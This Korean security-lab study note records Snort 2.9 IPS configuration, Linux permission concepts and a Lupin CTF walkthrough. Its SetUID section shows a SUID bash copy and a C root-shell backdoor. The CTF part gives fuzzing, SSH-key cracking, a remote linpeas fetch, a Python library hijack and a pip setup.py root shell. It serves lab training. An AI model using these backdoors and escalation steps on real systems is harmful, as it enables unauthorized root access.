# Security Lab TIL — 2025.05.14

> Snort IPS 구성부터 CTF 권한 상승까지.

---

## 환경 구성

| 머신 | 역할 |
|------|------|
| 우분투 (원조) | Snort + OSSEC |
| 우분투 (리버스) | Snort 2.9.x |
| 칼리 | Suricata + 공격자 역할 |

어댑터 두 개 연결 — 하나는 NAT, 하나는 브릿지. 둘 다 Promiscuous Mode 허용.

---

## 네트워크 세팅 (아침마다 핑 안 터지면 이거 치면 됨)

```bash
sudo ip addr add 172.16.11.236/24 dev enp0s3
sudo ip link set enp0s3 up
sudo ip route add default via 172.16.11.254 dev enp0s3

sudo ip link set enp0s3 up
sudo ip link set enp0s8 up
sudo ip link set enp0s3 promisc on
sudo ip link set enp0s8 promisc on
sudo ip link show enp0s3
ip addr
```

> ⚠️ 정적 IP랑 DHCP 겹치면 게이트웨이 날아감. 주의.

---

## Snort 2.9 IPS 구성

### 설치

```bash
sudo apt install -y snort
# 설치 중 네트워크 대역 입력: 172.16.11.0/24
sudo snort -V   # 2.9.20 확인
```

### snort.conf 핵심 수정

```bash
sudo vi /etc/snort/snort.conf
```

```
config daq: afpacket
config daq_mode: inline
config logdir: /var/log/snort
```

> Snort 3.x(Lua 기반)랑 설정 구조가 달라서 헷갈릴 수 있음. 2.9 기준.

### 설정 테스트 및 실행

```bash
# 설정 파일 문법 테스트
sudo snort -T -c /etc/snort/snort.conf -i enp0s3:enp0s8

# IPS 모드로 실행
sudo snort -A console -Q -c /etc/snort/snort.conf -i enp0s3:enp0s8
```

### ICMP 차단 룰 작성

```bash
sudo vi /etc/snort/rules/local.rules
```

```
drop icmp any any -> any any (msg:"IPS PING TEST"; sid:1000001; rev:1;)
```

```bash
# 칼리에서 핑 날리기
sudo ping 172.16.11.236

# 차단 로그 확인
tail /var/log/snort/snort.alert.fast | grep drop
```

---

## Linux 권한 개념 정리

### /etc/passwd 필드 구조

| 순서 | 필드 | 설명 |
|------|------|------|
| 1 | Username | 로그인 이름 |
| 2 | Password | 현재는 `x` (실제값은 /etc/shadow) |
| 3 | UID | 사용자 고유 ID (0 = root) |
| 4 | GID | 기본 그룹 ID |
| 5 | GECOS | 이름/연락처 등 부가 정보 |
| 6 | Home Dir | 홈 디렉토리 경로 |
| 7 | Shell | 기본 쉘 경로 |

### SetUID (SUID)

- 실행 시 **파일 소유자의 권한(EUID)**으로 동작
- 숫자 표기: `4755` / 문자 표기: `-rwsr-xr-x`
- 보안 점검 명령어:

```bash
sudo find / -user root -perm /4000
```

### RGID vs EGID

| 구분 | 설명 |
|------|------|
| RGID | 실제 실행한 사용자의 그룹 ID |
| EGID | 커널이 권한 체크 시 실제로 사용하는 그룹 ID |

### SetUID 백도어 실습

```bash
# bash 복사 후 SUID 설정
cp /bin/bash /tmp/bash
chmod 4755 /tmp/bash
cd /tmp && ./bash

# C 백도어 작성
vi /tmp/backdoor.c
```

```c
#include <stdio.h>
main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

```bash
gcc -o backdoor backdoor.c
su ys
./backdoor   # → root 쉘 획득
```

### Sticky Bit

```bash
mkdir /share_d
chmod 1777 /share_d
ls -ld /share_d
# drwxrwxrwt 2 root root 4096 ...
```

> 공용 디렉토리에서 "내 파일은 나(와 root)만 지울 수 있다"는 권한. `/tmp`가 대표적.

---

## CTF — Lupin

### 정찰

```bash
sudo nmap -A -sS -sC -p- 172.16.11.219
sudo dirb http://172.16.11.219
sudo gobuster dir -u http://172.16.11.219 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### FFUF 디렉토리 퍼징

```bash
# ~FUZZ 형태로 유저 디렉토리 탐색
sudo ffuf -u http://172.16.11.219/~FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 -c
# → /~secret 발견

# 확장자 포함 파일 탐색
sudo ffuf -u http://172.16.11.219/~secret/.FUZZ \
  -e .py,.java,.php,.dart,.rar,.zip,.txt,.html \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 -c -ic -fc 403
```

### SSH 키 크랙

```bash
sudo chmod 600 /home/red/victim_id_rsa
sudo ssh2john /home/red/victim_id_rsa > hash_password
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash_password
# → P@55w0rd!
```

### 인코딩 비교 (Base64 vs Base58)

| 구분 | Base64 | Base58 |
|------|--------|--------|
| 문자 수 | 64개 | 58개 |
| 특수문자 | `+`, `/` 포함 | 없음 |
| 패딩 | `=` 사용 | 없음 |
| 주 용도 | 데이터 전송, 이메일 | 암호화폐 주소 |

### 권한 상승 — Library Hijacking

```bash
# linpeas 다운로드 및 실행
python3 -m http.server 8080   # 공격자 머신
wget http://172.16.11.213:8000/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# webbrowser.py 하이재킹
find / -name '*webbrowser*' 2>/dev/null
vi /usr/lib/python3.9/webbrowser.py
# → import 아래에 추가: os.system("/bin/bash")

sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
id   # arsene 권한 획득
```

### 권한 상승 — pip setup.py

```bash
sudo -l   # pip 권한 확인

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/bin/pip install $TF
# → root 쉘 획득
```

---

## nmap 옵션 요약

| 옵션 | 명칭 | 설명 |
|------|------|------|
| `-sV` | Version Detection | 서비스 버전 확인 |
| `-sS` | TCP SYN Scan | 스텔스 스캔 |
| `-sU` | UDP Scan | UDP 포트 스캔 |
| `-sC` | Default Script | 기본 NSE 스크립트 실행 |
| `-sn` | Ping Scan | 생존 여부만 확인 (구버전 `-sP`) |
| `-A` | Aggressive | OS/버전/스크립트/traceroute 통합 |
| `-p-` | All Ports | 전체 65535 포트 스캔 |
